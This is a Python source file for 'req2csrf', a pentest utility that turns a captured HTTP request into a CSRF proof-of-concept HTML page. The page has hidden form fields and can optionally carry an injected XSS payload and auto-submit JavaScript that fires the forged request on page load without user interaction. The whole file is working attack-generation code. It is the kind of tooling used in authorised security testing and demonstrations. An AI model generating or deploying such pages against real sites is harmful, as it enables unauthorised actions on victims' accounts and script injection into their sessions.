import json
import html
import argparse
from urllib.parse import urlparse, parse_qs


def print_banner():
    print("""
                 ___                __ 
                |__ \              / _|
  _ __ ___  __ _   ) |___ ___ _ __| |_ 
 | '__/ _ \/ _` | / // __/ __| '__|  _|
 | | |  __/ (_| |/ /| (__\__ \ |  | |  
 |_|  \___|\__, |____\___|___/_|  |_|  
              | |                      
              |_|    v0.3 (pre-release)
                     by Qurius                         

""")


def generate_html(method: str, url: str, params: list, placeholder: str, payload: str, autosubmit: bool = False) -> str:
    """
    Generates a HTML file with a form containing the necessary parameters to forge a valid request to the specified endpoint. The form has a submit button that performs the request. Additionaly, if the "autosubmit" parameter is set to "True", function adds a JavaScript code, that submits the form automatically.
    """

    form_inputs = ""
    autosubmit_js = "<script>var form = document.querySelector(\"form\");form.submit();</script>"

    for key, value in params.items():
        if key == placeholder:
            form_input = f'<input type="hidden" id="{key}" name="{key}" value="{html.escape(payload)}">\n\t\t'
            print("[+] XSS payload injected")
        else:
            value_stripped = value[0].replace("\n", "")
            form_input = f'<input type="hidden" id="{key}" name="{key}" value="{value_stripped}">\n\t\t'
        
        form_inputs += ''.join(form_input)

    final_form  = f'''
<!DOCTYPE html>
<html lang="en">

<!-- Auto-generated by req2csrf tool v0.3 by Qurius https://github.com/qur1us/req2csrf -->

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF demonstration</title>
</head>
<body>
    <h1>CSRF demonstration</h1>
    <form action="{url}" method="{method}">
        {form_inputs}
        <input type="submit" value="Submit">
    </form>
    {autosubmit_js if autosubmit else ""}
</body>
</html>
'''
    print("[+] Succesfully generated malicious HTML")

    return final_form


def process_http_request(reqeust_path: str) -> list[str, str, dict]:
    """
    Parses the text file containing the HTTP request. Function extracts:
    - HTTP method,
    - target URL,
    - and all GET/POST parameters necessary to forge a CSRF request to the vulnerable website.

    Function returns a list of these values.
    """

    with open(reqeust_path, 'r') as file:
        http_request = file.read()

    # Split the request into headers and body
    headers_raw, body = http_request.split('\n\n', 1)

    # METHOD /path HTTP/1.1
    first_line = headers_raw.split('\n')[0].split(' ')

    # HTTP headers
    headers = headers_raw.split('\n')[1:]

    method = first_line[0]
    path = first_line[1]
    host = ""
    content_type = ""

    for header in headers:
        if "Host" in header:
            host = header.split(': ')[1]
        if "Content-Type" in header:
            content_type = header.split(': ')[1]
    
    url = "https://" + host + path

    params = {}

    # Parse the body based on the content type
    if 'application/x-www-form-urlencoded' in content_type:
        params = parse_qs(body)
    elif 'application/json' in content_type:
        params = json.loads(body)
    elif 'multipart/form-data' in content_type:
        res = body.split("Content-Disposition: form-data; name=\"")

        for r in res[1:]:
            key = r.split("\"")[0]
            value = [r.split("\"")[1].split("\n")[2]]
            
            params[key] = value
    else:
        print("[x] An error occured while parsing the parameters: Unsupported Content-Type")
        print("[i] Attepmting to parse parameters from URL")
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

    print("[+] Succesfully parsed request parameters")

    return method, url, params


def save(html, outfile) -> None:
    with open(outfile, 'w') as file:
        file.write(html)


def main():
    print_banner()

    parser = argparse.ArgumentParser(description="HTTP requests to CSRF PoC converter")

    parser.add_argument('-r', '--request', help='HTTP request file path')
    parser.add_argument('-c', '--chain', action='store_true', help='Chain SSRF and XSS')
    parser.add_argument('-p', '--placeholder', help='GET/POST parameter to place the XSS payload to')
    parser.add_argument('-x', '--payload', help='XSS payload to use')
    parser.add_argument('-a', '--autosubmit', action='store_true', help='CSRF payload will be executed automatically, no interaction required (default: button)')
    parser.add_argument('-o', '--output', help='Output file path (default: STDOUT)')

    args = parser.parse_args()

    request_file = args.request
    chain = args.chain
    placeholder = args.placeholder
    payload = args.payload
    autosubmit = args.autosubmit
    output_file = args.output if args.output else "STDOUT"
    
    # Check chain params
    if chain:
        if not placeholder or not payload:
            print("[x] Please provide sufficient chain arguments!")
            exit(-1)

    print(f"[i] Input file: {request_file}")
    print(f"[i] Output file: {output_file}")
    print(f"[i] Chaining SSRF and XSS: {chain}")
    print(f"[i] Submit form automatically: {autosubmit}\n")

    # Process the HTTP request
    method, url, params = process_http_request(request_file)

    # Generate HTML
    html = generate_html(method, url, params, placeholder, payload, autosubmit)

    # Save to a file or print to STDOUT
    if "STDOUT" not in output_file:
        save(html, output_file)
        print(f"\n[+] Output file saved to: {output_file}\n")
    else:
        print("\n[*] Output:")
        print(html)


if __name__ == '__main__':
   main()

